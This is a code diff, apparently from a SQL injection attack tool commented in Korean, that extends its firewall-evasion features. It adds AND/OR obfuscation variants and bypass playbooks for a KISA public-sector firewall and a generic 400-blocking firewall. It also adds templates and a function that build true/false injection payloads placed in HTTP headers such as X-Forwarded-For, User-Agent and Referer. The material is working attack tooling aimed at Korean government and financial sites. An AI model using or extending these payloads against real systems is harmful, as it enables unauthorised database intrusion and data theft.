@@ -154,15 +154,32 @@ FUNCTION_ALTERNATIVES: dict[str, list[str]] = {
     "AND": [
         "&&",
         "AND/**/",
-        "%26%26",   # URL 인코딩 &&
+        "%26%26",           # URL 인코딩 &&
         "AND%0a",
         "/*!AND*/",
+        # v1.2.0 추가 — 고급 우회
+        "/*!12345AND*/",    # 버전 인라인 주석
+        "AnD",              # 대소문자 혼합
+        "AND%09",           # 탭 공백
+        "%09AND%09",        # 탭 양쪽
+        "%00AND%00",        # NULL 바이트
+        "AND%0d%0a",        # CRLF
+        "XOR/**/0/**/OR",   # MySQL XOR 우회 (1 XOR 0 = 1)
+        "%2526%2526",       # 이중 URL 인코딩 &&
     ],
     "OR": [
         "||",
         "OR/**/",
         "%7c%7c",
         "OR%0a",
+        # v1.2.0 추가
+        "/*!12345OR*/",
+        "Or",
+        "OR%09",
+        "%09OR%09",
+        "%00OR%00",
+        "OR%0d%0a",
+        "%257c%257c",       # 이중 URL 인코딩 ||
     ],
 }
 
@@ -379,7 +396,103 @@ GLOBAL_WAF_PROFILES: dict[str, dict] = {
         "tampers": ["space2comment", "versionedmorekeywords", "randomcase"],
         "notes": "한국 금융/공공기관 多 사용",
     },
+
+    # ── KISA WAF (한국인터넷진흥원 / 공공기관 전용) ──────────────
+    "kisa": {
+        "vendor": "KISA / 공공기관 전용 WAF (Korea Internet & Security Agency)",
+        "detection": ["KISA", "kisa", "비정상적인 접근", "보안 정책", "차단 페이지"],
+        "bypass_strategy": [
+            "/*!12345AND*/ 버전 인라인 주석 — AND/OR 키워드 직접 우회",
+            "%09(탭)을 공백 대신 사용: ?id=1%09AND%091=1",
+            "CASE WHEN 조건문: CASE WHEN 1=1 THEN 1 ELSE 0 END (AND 없음)",
+            "HTTP 헤더 인젝션: X-Forwarded-For, Referer, User-Agent에 페이로드",
+            "파라미터 오염(HPP): ?id=1&id=payload — 일부 파서가 뒤쪽 값 처리",
+            "소문자 혼합: AnD, Or",
+            "NULL 바이트 삽입: %00AND%001=1",
+            "LIKE/REGEXP 조건으로 AND/OR 대체",
+        ],
+        "tampers": ["space2tab", "versionedmorekeywords", "randomcase", "nullbyte"],
+        "notes": "공공기관 표준 WAF — 400 응답으로 SQL 키워드 차단. 헤더 인젝션이 가장 효과적",
+    },
+
+    # ── Generic 400-block WAF (AND/OR→400 패턴) ──────────────────
+    "generic_400": {
+        "vendor": "Unknown WAF (AND/OR → 400 Block Pattern)",
+        "detection": ["400 bad request", "blocked", "웹 방화벽", "접근이 차단"],
+        "bypass_strategy": [
+            "STEP 1: /*!12345AND*/ 버전 인라인 주석 시도",
+            "STEP 2: %09(탭) 공백 치환: %09AND%09",
+            "STEP 3: CASE WHEN 1=1 THEN 1 ELSE 0 END",
+            "STEP 4: HTTP 헤더 인젝션 — User-Agent/Referer에 페이로드",
+            "STEP 5: X-Forwarded-For: 127.0.0.1 추가 + 페이로드",
+            "STEP 6: POST 바디로 전환 (GET 파라미터 대신)",
+            "STEP 7: 청크 분할 전송 (Transfer-Encoding: chunked)",
+        ],
+        "tampers": ["versionedmorekeywords", "space2tab", "nullbyte", "randomcase"],
+        "notes": "단따옴표로 크기 변화 있으면 injection point는 존재 — WAF만 돌파하면 됨",
+    },
 }
+
+
+# ════════════════════════════════════════════════════════════════
+# HTTP 헤더 인젝션 — URL 파라미터 WAF 우회 완전 실패 시 최후 수단
+# ════════════════════════════════════════════════════════════════
+HTTP_HEADER_INJECTION_TEMPLATES: list[dict] = [
+    {
+        "header": "X-Forwarded-For",
+        "template": "127.0.0.1' {condition} --",
+        "desc": "X-Forwarded-For IP 필드에 페이로드 삽입",
+        "notes": "일부 백엔드가 이 헤더를 WHERE 조건에 포함 (IP 로깅 기능)",
+    },
+    {
+        "header": "User-Agent",
+        "template": "Mozilla/5.0' {condition} -- -",
+        "desc": "User-Agent에 페이로드 삽입",
+        "notes": "방문자 로그/통계 테이블에 User-Agent 저장하는 경우",
+    },
+    {
+        "header": "Referer",
+        "template": "https://www.google.com/search?q=1' {condition} -- -",
+        "desc": "Referer 헤더에 페이로드 삽입",
+        "notes": "유입 경로 추적 기능 있는 사이트에서 효과적",
+    },
+    {
+        "header": "X-Real-IP",
+        "template": "192.168.1.1' {condition} --",
+        "desc": "X-Real-IP 헤더 인젝션",
+        "notes": "X-Forwarded-For 보완 헤더",
+    },
+    {
+        "header": "Accept-Language",
+        "template": "ko-KR,ko' {condition} --",
+        "desc": "Accept-Language 헤더 인젝션",
+        "notes": "다국어 처리 로직에서 헤더값을 쿼리에 포함하는 경우",
+    },
+]
+
+
+def get_header_injection_payloads(condition_true: str, condition_false: str) -> list[dict]:
+    """HTTP 헤더 인젝션 페이로드 쌍 생성.
+
+    Parameters
+    ----------
+    condition_true  : TRUE 조건 (예: "AND 1=1")
+    condition_false : FALSE 조건 (예: "AND 1=2")
+
+    Returns
+    -------
+    list of dict: [{"header": ..., "true_payload": ..., "false_payload": ...}, ...]
+    """
+    result = []
+    for tmpl in HTTP_HEADER_INJECTION_TEMPLATES:
+        result.append({
+            "header": tmpl["header"],
+            "true_payload":  tmpl["template"].replace("{condition}", condition_true),
+            "false_payload": tmpl["template"].replace("{condition}", condition_false),
+            "desc": tmpl["desc"],
+            "notes": tmpl["notes"],
+        })
+    return result
 
 # ════════════════════════════════════════════════════════════════
 # 다국어 에러 메시지 — SQL 에러 감지용 (v1.1.0)
